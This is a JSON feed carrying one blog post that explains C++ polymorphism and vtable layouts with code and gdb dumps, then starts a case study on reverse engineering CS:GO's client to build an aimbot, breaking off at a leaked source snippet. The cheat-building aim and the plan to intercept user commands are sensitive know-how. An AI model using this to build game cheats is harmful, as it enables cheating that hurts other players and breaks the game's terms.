{
    "version": "https://jsonfeed.org/version/1",
    "title": "null",
    "description": "eku",
    "home_page_url": "https://aesophor.github.io",
    "items": [
        {
            "id": "https://aesophor.github.io/2023/05/19/C-Polymorphism-VTables-and-Game-Hacking/",
            "url": "https://aesophor.github.io/2023/05/19/C-Polymorphism-VTables-and-Game-Hacking/",
            "title": "C++ Polymorphism, vtables, and Game Hacking",
            "date_published": "2023-05-19T12:36:10.000Z",
            "content_html": "<p><img data-src=\"banner.png\" alt=\"banner\"></p>\n<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<p>Before we begin, I assume that you already have a good understanding of Object-Oriented Programming and know about the three pillars of OOP: (1) Encapsulation, (2) Inheritance, and (3) Polymorphism. Additionally, you should already be able to easily distinguish between (1) Funciton overloading and (2) Function overriding. The remainder of this post is structured as follows:</p>\n<ol>\n<li>Object-Oriented Programming in C++</li>\n<li>vtables: How C++ polymorphism works under the hood</li>\n<li>Case study: Reverse engineering vtables in real-world binaries (CS:GO)</li>\n</ol>\n<h1 id=\"object-oriented-programming-in-c\"><a class=\"markdownIt-Anchor\" href=\"#object-oriented-programming-in-c\">#</a> Object-Oriented Programming in C++</h1>\n<h2 id=\"upcasting-and-downcasting\"><a class=\"markdownIt-Anchor\" href=\"#upcasting-and-downcasting\">#</a> Upcasting and Downcasting</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Ellipse</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Circle</span></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  Circle <span class=\"token operator\">*</span>c <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">Circle</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// [1]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  Circle <span class=\"token operator\">*</span>e1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">Ellipse</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">// [2]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  Ellipse <span class=\"token operator\">*</span>e2 <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">dynamic_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>Ellipse <span class=\"token operator\">*</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span>e1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// [3] if dynamic_cast() fails, e2 will be a nullptr.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ul>\n<li>Case 1\n<ul>\n<li>We are about to create and initialize a new Circle object.</li>\n<li>We allocate memory using  <code>operator new</code>  and obtain  <code>c</code> , the address of our new Circle object.</li>\n<li><code>c</code>  as well as an additional argument  <code>5</code>  are passed to the constructor of Circle.</li>\n<li>The constructor of Circle initializes our new object.</li>\n<li>The address of our new Circle object is stored in a pointer to a Circle.</li>\n</ul>\n</li>\n<li>Case 2: <strong>upcasting</strong>\n<ul>\n<li>Ellipse derives from its base class, Circle</li>\n<li>In C++, it is perfectly legal to assign a derived class‚Äôs pointer to a base class‚Äôs pointer, or bind a derived class‚Äôs reference to a base class‚Äôs reference.</li>\n<li>What if we want to do this in reverse? The answer is downcasting.</li>\n</ul>\n</li>\n<li>Case 3: <strong>downcasting</strong>\n<ul>\n<li>If we need to cast  <code>e1</code>  (a Circle) back to an Ellipse again, we need to explicitly downcast it.</li>\n<li>If the underlying object pointed to by  <code>e1</code>  is indeed an Ellipse, then dynamic_cast() will succeed.</li>\n<li>Otherwise, dynamic_cast() will return a nullptr.</li>\n<li>An ellipse is surely a circle, but a circle isn‚Äôt necessarily an ellipse, right? ü§ì</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"overriding-virtual-methods\"><a class=\"markdownIt-Anchor\" href=\"#overriding-virtual-methods\">#</a> Overriding Virtual Methods</h2>\n<p>In C++, if a ‚Äúmember function‚Äù (or ‚Äúmethod‚Äù) is declared  <code>virtual</code> , then it will be polymorphic at runtime. Let‚Äôs take a look at this example:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">double</span> <span class=\"token function\">GetArea</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Circle::GetArea()\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> std<span class=\"token double-colon punctuation\">::</span>numbers<span class=\"token double-colon punctuation\">::</span>pi <span class=\"token operator\">*</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">pow</span><span class=\"token punctuation\">(</span>radius_<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Ellipse</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Circle</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// Since Circle::GetArea() is already virtual, Ellipse::GetArea() will also be implicitly virtual.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// As a result, it's not mandatory to write virtual here. However, I believe that it's always a</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token comment\">// good practice to mark the overridden methods as virtual, since this makes the function prototype</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token comment\">// more self-documenting.</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">double</span> <span class=\"token function\">GetArea</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">override</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Ellipse::GetArea()\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> std<span class=\"token double-colon punctuation\">::</span>numbers<span class=\"token double-colon punctuation\">::</span>pi <span class=\"token operator\">*</span> radius_a_ <span class=\"token operator\">*</span> radius_b_<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  std<span class=\"token double-colon punctuation\">::</span>shared_ptr<span class=\"token operator\">&lt;</span>Circle<span class=\"token operator\">></span> c1 <span class=\"token operator\">=</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token generic-function\"><span class=\"token function\">make_shared</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>Circle<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  c1<span class=\"token operator\">-></span><span class=\"token function\">GetArea</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  std<span class=\"token double-colon punctuation\">::</span>shared_ptr<span class=\"token operator\">&lt;</span>Circle<span class=\"token operator\">></span> c2 <span class=\"token operator\">=</span> std<span class=\"token double-colon punctuation\">::</span><span class=\"token generic-function\"><span class=\"token function\">make_shared</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>Ellipse<span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  c2<span class=\"token operator\">-></span><span class=\"token function\">GetArea</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>$ clang++ -std=c++20 -o out po.cc &amp;&amp; ./out\nCircle::GetArea()\nEllipse::GetArea()\n</code></pre>\n<p>In the above program:</p>\n<ul>\n<li>We have two classes:  <code>Circle</code>  and  <code>Ellipse</code> , where  <code>Ellipse</code>  derives from  <code>Circle</code> .\n<ul>\n<li><code>Ellipse::GetArea()</code>  overrides  <code>Circle::GetArea()</code> .</li>\n</ul>\n</li>\n<li>In main()\n<ul>\n<li><code>c1</code>  points to an instance of Circle, and its type is  <code>shared_ptr&lt;Circle&gt;</code></li>\n<li><code>c2</code>  points to an instance of Ellipse, but its type is also  <code>shared_ptr&lt;Circle&gt;</code></li>\n</ul>\n</li>\n<li>Question:\n<ul>\n<li><code>c2</code>  is of type  <code>shared_ptr&lt;Circle&gt;</code></li>\n<li>When we invoke  <code>c2-&gt;GetArea()</code> , which method will be called?</li>\n<li><code>Circle::GetArea()</code>  or  <code>Ellipse::GetArea()</code> ?</li>\n</ul>\n</li>\n<li>Answer:\n<ul>\n<li><code>Ellipse::GetArea()</code></li>\n<li>Reason: Although an ellipse can be viewed as a circle, but when we need to calculate its area, we want to use the correct formula.</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"vtables-how-c-polymorphism-works-under-the-hood\"><a class=\"markdownIt-Anchor\" href=\"#vtables-how-c-polymorphism-works-under-the-hood\">#</a> vtables: How C++ polymorphism works under the hood</h1>\n<blockquote>\n<p>You: So, you‚Äôre telling me that the above program knows the underlying type  <code>c2</code>  points to is actually an Ellipse, not a Circle?<br>\naesophor: Yes, exactly.</p>\n</blockquote>\n<blockquote>\n<p>You: Wait! How is that possible?<br>\naesophor: This magic is thanks to ‚Äúvtable‚Äù, and we‚Äôre going to demystify it now.</p>\n</blockquote>\n<p>In this section, we discuss three types of inheritance in C++, and how vtables look under these circumstances.</p>\n<h2 id=\"single-inheritance\"><a class=\"markdownIt-Anchor\" href=\"#single-inheritance\">#</a> Single Inheritance</h2>\n<p>When a class has at least one virtual method (including those inherited from its base classes), then through gdb we can see the first 8 bytes is  <code>_vptr</code> , a pointer to the vtable of this class. All of its data members will be placed after  <code>_vptr</code> .</p>\n<ul>\n<li>The  <code>Derived</code>  class overrides the method  <code>foo()</code></li>\n<li>In the vtable of  <code>Derived</code> , the first virtual function is  <code>Derived::foo()</code> , not  <code>Parent::foo()</code> .</li>\n</ul>\n<p><img data-src=\"single.png\" alt=\"\"></p>\n<h2 id=\"multiple-inheritance\"><a class=\"markdownIt-Anchor\" href=\"#multiple-inheritance\">#</a> Multiple Inheritance</h2>\n<p>Before we talk about multiple inheritance, we need to clarify two terms: (1) primary base (2) secondary bases.<br>\nThese terms are borrowed from: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWZzcGVjcy5saW51eGJhc2Uub3JnL2N4eGFiaS0xLjc1Lmh0bWw=\">Itanium C++ ABI (Revision: 1.75)</span>. In short:</p>\n<pre><code>class Child : public Base1, public Base2, public Base3, ..., public BaseN &#123;\n              |__________|  |___________________________________________|\n              Primary Base                Secondary Bases\n</code></pre>\n<p>In the following example, the class  <code>Child</code>  derives from  <code>Mother</code> ,  <code>Father</code>  and  <code>Aunt</code>  (not so ethical‚Ä¶)</p>\n<ul>\n<li><code>Mother</code>  is the primary base class, and it shares the same vtable with  <code>Child</code> .</li>\n<li><code>Father</code>  is one of the secondary base classes, and it has a standalone vtable.</li>\n<li><code>Aunt</code>  is also one of the secondary base classes, and it has a standalone vtable.</li>\n</ul>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Mother</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">mother_foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Father</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">father_foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Aunt</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">aunt_foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Child</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">Mother</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">Father</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">Aunt</span></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> <span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">virtual</span> <span class=\"token keyword\">void</span> <span class=\"token function\">child_foo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    Child c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>With gdb, we can prove that the aforementioned rules about vtables are correct.</p>\n<pre><code>00:0000‚îÇ rsp 0x7fffffffe040 ‚Äî‚ñ∏ 0x555555557ce0 ‚Äî‚ñ∏ 0x555555555272 (Mother::mother_foo()) ‚óÇ‚Äî endbr64\n01:0008‚îÇ     0x7fffffffe048 ‚Äî‚ñ∏ 0x555555557d00 ‚Äî‚ñ∏ 0x555555555282 (Father::father_foo()) ‚óÇ‚Äî endbr64\n02:0010‚îÇ     0x7fffffffe050 ‚Äî‚ñ∏ 0x555555557d18 ‚Äî‚ñ∏ 0x555555555292 (Aunt::aunt_foo()) ‚óÇ‚Äî endbr64\n03:0018‚îÇ     0x7fffffffe058 ‚óÇ‚Äî 0x696db6e89b61aa00\n04:0020‚îÇ rbp 0x7fffffffe060 ‚óÇ‚Äî 0x0\n05:0028‚îÇ     0x7fffffffe068 ‚Äî‚ñ∏ 0x7ffff7bc7083 (__libc_start_main+243) ‚óÇ‚Äî mov    edi, eax\n</code></pre>\n<p>Now, let‚Äôs look at my slides for a more distilled example</p>\n<ul>\n<li><code>Mother::mother_foo()</code>  and  <code>Child::child_foo()</code>  are placed within the same vtable.</li>\n<li>The virtual functions from the primary base class comes first, and then those from the derived class follow.</li>\n</ul>\n<p><img data-src=\"multi-1.png\" alt=\"\"></p>\n<p>What if  <code>Child</code>  overrides a virtual function in a secondary base class, you ask‚Ä¶</p>\n<ul>\n<li>A new vtable entry is added to the primary vtable:  <code>Child::father_foo()</code></li>\n<li>In Father‚Äôs vtable,  <code>Father::father_foo()</code>  is replaced with a  <code>non-virtual thunk to Child::father_foo()</code>  ü§î</li>\n<li>So if we cast a  <code>Child *</code>  to a  <code>Father *</code>  and invoke  <code>father_foo()</code> ‚Ä¶\n<ul>\n<li>it will adjust  <code>this</code>  pointer by  <code>-0x10</code>  (offset_to_top)</li>\n<li>call the 2nd virtual function in the primary vtable.</li>\n<li>i.e.  <code>Child::father_foo(/*this=*/rdi - 0x10)</code></li>\n</ul>\n</li>\n</ul>\n<p><img data-src=\"multi-2.png\" alt=\"\"></p>\n<p>This also implies that:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p1 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p2 <span class=\"token operator\">=</span> <span class=\"token generic-function\"><span class=\"token function\">static_cast</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>Father <span class=\"token operator\">*</span><span class=\"token operator\">></span></span></span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// p1 != p2</span></pre></td></tr></table></figure><h2 id=\"virtual-inheritance\"><a class=\"markdownIt-Anchor\" href=\"#virtual-inheritance\">#</a> Virtual Inheritance</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVmlydHVhbF9pbmhlcml0YW5jZQ==\">Virtual inheritance</span> in C++ is a technique to eliminate the ‚Äúdiamond of death‚Äù by ensuring only one copy of a base class‚Äôs member variables are inherited by grandchild derived classes. Let‚Äôs take a look at an example from libstdc++ 10.2.0:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// Templates omitted for simplicity.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">ios_base</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">basic_ios</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">ios_base</span></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">basic_istream</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">virtual</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">basic_ios</span></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">basic_ostream</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">virtual</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">basic_ios</span></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">basic_iostream</span> <span class=\"token operator\">:</span> <span class=\"token base-clause\"><span class=\"token keyword\">public</span> <span class=\"token class-name\">basic_istream</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">public</span> <span class=\"token class-name\">basic_ostream</span></span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Without virtual inheritance, the data members of  <code>basic_ios</code>  will be passed down twice to the most derived class  <code>basic_iostream</code>  (one via  <code>basic_istream</code> , one via  <code>basic_ostream</code> ), resulting in ambiguous and duplicated data members in  <code>basic_iostream</code> . To understand the layout of vtables under virtual inheritance, let‚Äôs begin with the simplest scenario:</p>\n<p><img data-src=\"virt-single-1.png\" alt=\"\"></p>\n<p>In single inheritance and multiple inheritance, the derived class will share the same vtable ( <code>_vptr (primary)</code> ) with the primary base class. However, with virtual inheritance, the virtual primary base class will always have a standalone vtable ( <code>_vptr (vbase)</code> ). What‚Äôs more, a new entry is added to the beginning of all vtables involved:  <code>virtual_base_offset</code> . This offset ensures that all parent‚Äôs data members will only have one copy, and that they will be stored in a single place (subsequent to  <code>_vptr (vbase)</code> ) instead of being stored next to  <code>_vptr (primary)</code> .</p>\n<p>Next, let‚Äôs see what happens if we override a parent‚Äôs virtual member function. In the following example, the derived class  <code>B</code>  overrides  <code>foo()</code>  from its base class  <code>A</code> .</p>\n<p><img data-src=\"virt-single-2.png\" alt=\"\"></p>\n<p>Similar to what happened with multiple inheritance as we discussed earlier, a new entry is inserted into the primary vtable ( <code>_vptr (primary)</code> , and the original entry in the virtual vtable ( <code>_vptr (vbase)</code> ) is now replaced with a  <code>virtual thunk to B::foo()</code> . If you recall, we‚Äôve seen a ‚Äúnon-virtual thunk to XXX‚Äù before, and this time it‚Äôs called a ‚Äúvirtual thunk to XXX‚Äù. Quite interesting‚Ä¶ ü§î</p>\n<p>Finally, let‚Äôs consider the most complicated scenario: <strong>The Diamond of Death</strong>. In the below example, We can see that both  <code>B</code>  and  <code>C</code>  virtually inherit from  <code>A</code> , and thanks to virtual inheritance, there‚Äôs only one copy of  <code>A</code> 's data members (they are placed in  <code>_vptr (vbase)</code> ).</p>\n<p><img data-src=\"virt-diamond-1.png\" alt=\"\"></p>\n<p>Let‚Äôs see what happen if we override a virtual member function from  <code>A</code> . Familiar things happen again!</p>\n<p><img data-src=\"virt-diamond-2.png\" alt=\"\"></p>\n<h1 id=\"case-study-reverse-engineering-c-vtables-in-real-world-binaries\"><a class=\"markdownIt-Anchor\" href=\"#case-study-reverse-engineering-c-vtables-in-real-world-binaries\">#</a> Case Study: Reverse Engineering C++ vtables in Real-World Binaries</h1>\n<p>In the last section, we demonstrate how to apply our knowledge in reverse engineering C++ vtable to game hacking. More specifically, we‚Äôll take the x86_64 macOS game client of <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdG9yZS5zdGVhbXBvd2VyZWQuY29tL2FwcC83MzAvQ291bnRlclN0cmlrZV9HbG9iYWxfT2ZmZW5zaXZlLw==\">Counter Strike: Global Offensive</span>, reverse engineer it, and create an internal cheat with aimbot (Ëá™ÁûÑÂ§ñÊéõ).</p>\n<p><a href=\"https://www.youtube.com/watch?v=YqYvJTnBTu0\"><img data-src=\"csgo-aimbot.png\" alt=\"\"></a></p>\n<h2 id=\"inspecting-the-game-client\"><a class=\"markdownIt-Anchor\" href=\"#inspecting-the-game-client\">#</a> Inspecting the Game Client</h2>\n<pre><code>$ file '~/Library/Application Support/Steam/steamapps/common/Counter-Strike Global Offensive/csgo/bin/osx64/client.dylib'\nclient.dylib: Mach-O 64-bit dynamically linked shared library x86_64\n</code></pre>\n<h2 id=\"background\"><a class=\"markdownIt-Anchor\" href=\"#background\">#</a> Background</h2>\n<p>From <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIudmFsdmVzb2Z0d2FyZS5jb20vd2lraS9Vc2VyY21k\">Valve Developer Wiki</span>:</p>\n<blockquote>\n<ol>\n<li>CUserCmd (‚Äúuser command‚Äù) is the networkable representation of the player‚Äôs input, including keys pressed and viewangle.</li>\n<li>Usercmds intended for transmission to the server are created when the engine invokes IBaseClientDLL::CreateMove (once per tick). The usercmds created are stored in a circular buffer (CInput::PerUserInput_t::m_pCommands) until the engine invokes IBaseClientDLL::WriteUsercmdDeltaToBuffer to compress and serialize them to the server.</li>\n</ol>\n</blockquote>\n<p>So the information of the player‚Äôs input (including the keys pressed and the current viewangle) is collected into a  <code>CUserCmd</code> , buffered in a circular buffer, and then sent to the game server.</p>\n<blockquote>\n<p>The current client mode is also given a chance to manipulate the newly created usercmd via IClientMode::CreateMove.</p>\n</blockquote>\n<p>So what if we can intercept the  <code>CUserCmd</code> s and edit them before they‚Äôre sent to the server? ü§Ø</p>\n<blockquote>\n<p>The default implementation (ClientModeShared::CreateMove) delegates to the local player via C_BasePlayer::CreateMove, which in turn passes the usercmd to CBaseCombatWeapon::CreateMove on the active weapon.</p>\n</blockquote>\n<p>By inspecting the <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Blcmlsb3Vzd2l0aGFkb2xsYXJzaWduL2NzdHJpa2UxNV9zcmMuZ2l0\">leaked codebase from 2013</span>, we can actually find the piece of code matching the above description.</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// game/client/clientmode_shared.cpp</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token class-name\">ClientModeShared</span><span class=\"token double-colon punctuation\">::</span><span class=\"token function\">CreateMove</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">float</span> flInputSampleTime<span class=\"token 